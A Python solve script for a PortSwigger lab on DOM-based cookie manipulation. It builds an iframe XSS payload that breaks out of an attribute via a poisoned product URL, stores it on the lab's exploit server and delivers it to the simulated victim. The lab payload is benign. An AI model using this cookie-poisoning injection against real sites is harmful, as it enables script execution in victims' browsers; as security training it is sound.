#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: DOM-based cookie manipulation.

The product page writes window.location.href into a `lastViewedProduct` cookie.
The home page reflects that cookie into an attribute-context DOM sink without
encoding. We poison the cookie with a crafted product URL that breaks out of
the attribute, then force the victim to the home page via an iframe latch.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


EXPLOIT_BODY_TEMPLATE = (
    "<iframe src=\"{lab}/product?productId=1&'><script>print()</script>\" "
    "onload=\"if(!window.x)this.src='{lab}';window.x=1;\">"
)


def post_exploit(exploit_server: str, body: str, session: requests.Session) -> None:
    data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody": body,
        "formAction": "STORE",
    }
    r = session.post(exploit_server.rstrip("/") + "/", data=data)
    r.raise_for_status()
    print("[+] Stored exploit on server")


def deliver(exploit_server: str, session: requests.Session) -> None:
    data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "formAction": "DELIVER_TO_VICTIM",
    }
    r = session.post(exploit_server.rstrip("/") + "/", data=data)
    r.raise_for_status()
    print("[+] Delivered exploit to victim")


def main():
    parser = argparse.ArgumentParser(
        description="Solve DOM-based Lab 5: cookie manipulation via product URL poisoning"
    )
    parser.add_argument("lab_url", help="Lab URL")
    parser.add_argument("exploit_url", help="Exploit server URL")
    parser.add_argument("--deliver", action="store_true", help="Store + DELIVER_TO_VICTIM")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    exploit = args.exploit_url.rstrip("/")

    body = EXPLOIT_BODY_TEMPLATE.format(lab=lab)
    print("[+] Exploit server body:\n")
    print(body)

    if args.deliver:
        s = requests.Session()
        s.verify = False
        post_exploit(exploit, body, s)
        deliver(exploit, s)
        r = s.get(lab)
        if "Congratulations" in r.text or "is-solved" in r.text:
            print("[+] Lab solved!")
        else:
            print("[*] Lab not yet marked solved — give the victim a few seconds and re-check.")
    else:
        print("\n[*] Paste the body into the exploit server, Store, then Deliver to Victim.")


if __name__ == "__main__":
    main()
